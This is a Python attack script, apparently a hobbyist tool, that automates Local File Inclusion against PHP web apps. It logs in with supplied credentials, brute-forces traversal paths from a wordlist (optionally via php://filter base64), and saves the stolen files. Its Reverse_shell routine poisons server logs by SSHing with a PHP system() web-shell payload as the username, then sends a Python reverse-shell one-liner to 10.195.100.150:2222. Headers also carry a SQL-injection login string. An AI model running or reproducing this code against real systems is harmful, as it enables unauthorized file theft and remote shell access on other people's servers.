#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
ssl._create_default_https_context = ssl._create_unverified_context  
from Package.one_read import Read_File
#php://filter/read=convert.base64-encode/resource=../../config.php
#ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136

path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
class Local_File_In :
    
        def __init__(self):
            
            self.control()
            if self.args.read:
               from Package.one_read import Read_File
               run = Read_File()
               exit()
            if self.args.Cookie:
                  with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               print("[+] Login url           : ................ | : "+self.args.loginurl)
               print("[+] username            : ................ | : "+self.args.user)
               print("[+] Login password      : ................ | : "+self.args.password)
            print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
            print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie) 
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl\
            and self.args.filelist:
                self.Login_auth()
                self.file_name()
                self.url_request()
                self.Reverse_shell()
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie\
            and self.args.filelist :
                self.url_request()
                
                self.Reverse_shell()
            else:
                print("[+] Logic command  Error"+'\n'+'='*30)  
                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ')  
                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie')  
                
        def Login_auth(self):
            loginurl = self.args.loginurl
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)
            request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),]
            url_login = request.open(loginurl) 
            request.select_form(nr = 0)
            if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
            elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
            elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
            response   = request.submit()         
            self.info = response.info()
           
          #  self.info_req =  self.info 
            content    = response.read()  
            self.url = response.geturl()  
                        
        def url_request(self): 
              
            self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl)#).strip(    
            if not os.path.exists('./FileStore/'+self.ip_re.group()+"/"):
                  os.makedirs('./FileStore/'+self.ip_re.group()+"/")                
            ssl._create_default_https_context = ssl._create_unverified_context                
            with open(self.args.filelist,'r') as readline :
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
                        URL = self.args.Vulnurl+ phpfillter+LINE

                    else:
                         URL = self.args.Vulnurl+LINE
                                                                                                          
                    self.url =  URL
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)              
                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),
                                 ('username',"admin'#"),
                                 ('password','password')]
                    first_req = request.open(self.args.Vulnurl).read()                                                      
                    self.Get_Oregnal_URL = request.open(self.url).read()  
                    print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
                    print("[+] Teating payload  : ................ | : "+self.url[-50:].replace('\\n',''))  
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')                             
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')

                    if self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :                  
                       pythex = str(re.findall('Content-Length:.+',str(self.info)))
                       pythex= pythex.replace("['",'').replace("']",'')
                       if pythex in str(self.info):
                         info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                         rex2 = re.findall(':.+',info)
                         print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                         print("[+] Date                : ................ | "+rex2[0])
                         print("[+] Server              : ................ | "+rex2[1])
                         print("[+] Expires             : ................ | "+rex2[2])
                         print("[+] Cache-Control       : ................ | "+rex2[3])
                         print("[+] Pragma              : ................ | "+rex2[4])
                         print("[+] Vary                : ................ | "+rex2[5])
                         print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                         print("[+] Connection          : ................ | "+rex2[7])
                         print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                         print('='*20+"\n[*] vulnerability Link  "+'\n'+'='*30+'\n')
                         print("[+] vulnerable Link     : ................ | : "+self.url)                        
                         self.file_name()
                         run = Read_File.store_file(self)
                         print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
                         print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                         print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))         
                         break 
                    elif not self.args.auth and len(self.Get_Oregnal_URL) != len(first_req) :
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                         self.file_name()
                         run = Read_File.store_file(self) 
                         print('='*20+"\n[*] attack progres "+'\n'+'='*30+'\n')
                         print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                         print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                         print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re.group()+"/"\
                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))                  
                         break
                   
            exit()                
        def Reverse_shell(self):
                 if 'log' in self.url :
                    order2 = '''ssh '<?php system($_GET['cmd']); ?>'@192.168.56.107'''
                    command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
                    call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
                    time.sleep(10)
                    command ="""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.195.100.150",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
                    fake_link = self.url.replace('\n','')+"&cmd="+command.replace('\n','')
                    print(fake_link)
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)
                    if self.args.Cookie:
                       with open(self.args.Cookie,'r') as Cookie_file :
                           Cookie =  Cookie_file.read() 
                           request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                             Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                            ('Cookie',str(Cookie).replace('\n','')),
                                            ('username',"admin'#"),
                                            ('password','password')]
                    feka_log = request.open(fake_link).read() 
                    print(feka_log )
        def file_name (self):
           removel  = ['..%2F','../','....//','file:///']
           self.url_remove = self.url.replace('http://','').replace('https://','')
           for i in removel :
                 if i in self.url_remove :
                    join = ";".join(self.url_remove.split(i[-1]))
                    split_list = join.split(';')
                    self.args.read= str("/".join((split_list[-3],split_list[-2],split_list[-1]))).replace('%2','/').replace('//','/').replace('\n','')          
                            
        def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ,help ="url Targst web") 
           parser.add_argument("--auth"               , action='store_true'                    ,help ="url Targst web") 
           parser.add_argument("-F","--filelist"      , action=None                            ,help ="read fron lfi wordlsit ")
           parser.add_argument("-C","--Cookie"        , action=None                            ,help ="Login sesion Cookie")  
           parser.add_argument("-B64","--base64"      , action='store_true'                    ,help ="Login sesion base64")  
           parser.add_argument("-R","--read"          , action=None                            ,help ="Login sesion base64")  
           parser.add_argument("-UF ","--UserForm"    , action=None                            ,help =" add name of the HTML Form Login User")
           parser.add_argument("-PF ","--PassForm"    , action=None                            ,help ="add name of the HTML Form Login Passord")
           parser.add_argument("-P  ","--password"    , action=None                            ,help ="use specific Passowrd")   
           parser.add_argument("-LU  ","--loginurl"   , action=None                            ,help ="use specific Passowrd") 
           parser.add_argument("-U  ","--user"        , action=None                            ,help ="use specific username ")
           self.args = parser.parse_args()     
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help()         
              exit()                   
if __name__=='__main__':
     Local_File_In()                  
                 
                 
                 
                 
                 
                 
                 
                 